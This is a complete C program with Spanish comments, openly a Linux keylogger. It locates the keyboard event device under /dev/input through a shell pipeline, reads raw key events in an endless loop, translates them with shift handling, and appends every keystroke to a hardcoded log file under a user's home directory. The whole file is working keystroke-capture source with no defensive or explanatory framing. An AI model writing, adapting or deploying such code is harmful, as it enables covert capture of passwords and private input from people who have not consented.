#include <stdio.h>
#include <fcntl.h>
#include <unistd.h>
#include <linux/input.h>
#include <sys/stat.h>
#include <string.h>
#include <stdlib.h>
#include <errno.h>

#define LOGFILEPATH "/home/ferpalma21/keylogger.txt"

// Prototipo de función
char *getEvent();
void logKey(FILE *fp, const char *output);

// Función para traducir el código de la tecla a un carácter imprimible
void translateKeyCode(int code, int shift, char *output);

int main(){
    struct input_event ev;
    static char path_keyboard[20] = "/dev/input/";
    strcat(path_keyboard, getEvent());
    path_keyboard[strlen(path_keyboard)-1] = 0;

    int device_keyboard = open(path_keyboard, O_RDONLY);
    if (device_keyboard < 0) {
        printf("Error al abrir el dispositivo: %d\n", errno);
        return 1;
    }

    FILE *fp = fopen(LOGFILEPATH, "a");
    if (fp == NULL) {
        printf("Error al abrir el archivo de logs: %d\n", errno);
        return 1;
    }

    int shift_pressed = 0;
    while (1) {
        read(device_keyboard, &ev, sizeof(ev));
        if (ev.type == EV_KEY) {
            if (ev.value == 1) { // Tecla presionada
                if (ev.code == KEY_LEFTSHIFT || ev.code == KEY_RIGHTSHIFT) {
                    shift_pressed = 1;
                }
            } else if (ev.value == 0) { // Tecla liberada
                char output[16] = {0}; // Espacio para teclas especiales
                if (ev.code == KEY_LEFTSHIFT || ev.code == KEY_RIGHTSHIFT) {
                    shift_pressed = 0;
                } else {
                    translateKeyCode(ev.code, shift_pressed, output);
                    if (strlen(output) > 0) {
                        printf("%s", output);
                        logKey(fp, output);
                    }
                }
            }
        }
    }

    fclose(fp);
    close(device_keyboard);
    return 0;
}

char *getEvent(){
    char *command = (char *) "cat /proc/bus/input/devices | grep -C 5 keyboard | grep -E -o 'event[0-9]'";
    static char event[8];
    FILE *pipe = popen(command, "r");
    if (!pipe)
        exit(1);
    fgets(event, 8, pipe);
    pclose(pipe);
    return event;
}

void translateKeyCode(int code, int shift, char *output) {
    switch(code) {
        case KEY_A: strcpy(output, shift ? "A" : "a"); break;
        case KEY_B: strcpy(output, shift ? "B" : "b"); break;
        case KEY_C: strcpy(output, shift ? "C" : "c"); break;
        case KEY_D: strcpy(output, shift ? "D" : "d"); break;
        case KEY_E: strcpy(output, shift ? "E" : "e"); break;
        case KEY_F: strcpy(output, shift ? "F" : "f"); break;
        case KEY_G: strcpy(output, shift ? "G" : "g"); break;
        case KEY_H: strcpy(output, shift ? "H" : "h"); break;
        case KEY_I: strcpy(output, shift ? "I" : "i"); break;
        case KEY_J: strcpy(output, shift ? "J" : "j"); break;
        case KEY_K: strcpy(output, shift ? "K" : "k"); break;
        case KEY_L: strcpy(output, shift ? "L" : "l"); break;
        case KEY_M: strcpy(output, shift ? "M" : "m"); break;
        case KEY_N: strcpy(output, shift ? "N" : "n"); break;
        case KEY_O: strcpy(output, shift ? "O" : "o"); break;
        case KEY_P: strcpy(output, shift ? "P" : "p"); break;
        case KEY_Q: strcpy(output, shift ? "Q" : "q"); break;
        case KEY_R: strcpy(output, shift ? "R" : "r"); break;
        case KEY_S: strcpy(output, shift ? "S" : "s"); break;
        case KEY_T: strcpy(output, shift ? "T" : "t"); break;
        case KEY_U: strcpy(output, shift ? "U" : "u"); break;
        case KEY_V: strcpy(output, shift ? "V" : "v"); break;
        case KEY_W: strcpy(output, shift ? "W" : "w"); break;
        case KEY_X: strcpy(output, shift ? "X" : "x"); break;
        case KEY_Y: strcpy(output, shift ? "Y" : "y"); break;
        case KEY_Z: strcpy(output, shift ? "Z" : "z"); break;
        case KEY_1: strcpy(output, shift ? "!" : "1"); break;
        case KEY_2: strcpy(output, shift ? "@" : "2"); break;
        case KEY_3: strcpy(output, shift ? "#" : "3"); break;
        case KEY_4: strcpy(output, shift ? "$" : "4"); break;
        case KEY_5: strcpy(output, shift ? "%" : "5"); break;
        case KEY_6: strcpy(output, shift ? "^" : "6"); break;
        case KEY_7: strcpy(output, shift ? "&" : "7"); break;
        case KEY_8: strcpy(output, shift ? "*" : "8"); break;
        case KEY_9: strcpy(output, shift ? "(" : "9"); break;
        case KEY_0: strcpy(output, shift ? ")" : "0"); break;
        case KEY_SPACE: strcpy(output, " "); break;
        case KEY_ENTER: strcpy(output, "\n"); break;
        case KEY_BACKSPACE: strcpy(output, "\b"); break;
        case KEY_TAB: strcpy(output, "\t"); break;
        case KEY_MINUS: strcpy(output, shift ? "_" : "-"); break;
        case KEY_EQUAL: strcpy(output, shift ? "+" : "="); break;
        case KEY_LEFTBRACE: strcpy(output, shift ? "{" : "["); break;
        case KEY_RIGHTBRACE: strcpy(output, shift ? "}" : "]"); break;
        case KEY_BACKSLASH: strcpy(output, shift ? "|" : "\\"); break;
        case KEY_SEMICOLON: strcpy(output, shift ? ":" : ";"); break;
        case KEY_APOSTROPHE: strcpy(output, shift ? "\"" : "'"); break;
        case KEY_COMMA: strcpy(output, shift ? "<" : ","); break;
        case KEY_DOT: strcpy(output, shift ? ">" : "."); break;
        case KEY_SLASH: strcpy(output, shift ? "?" : "/"); break;
        // Agrega más teclas especiales si es necesario
        default: output[0] = 0;
    }
}

void logKey(FILE *fp, const char *output) {
    fputs(output, fp);
    fflush(fp);
}
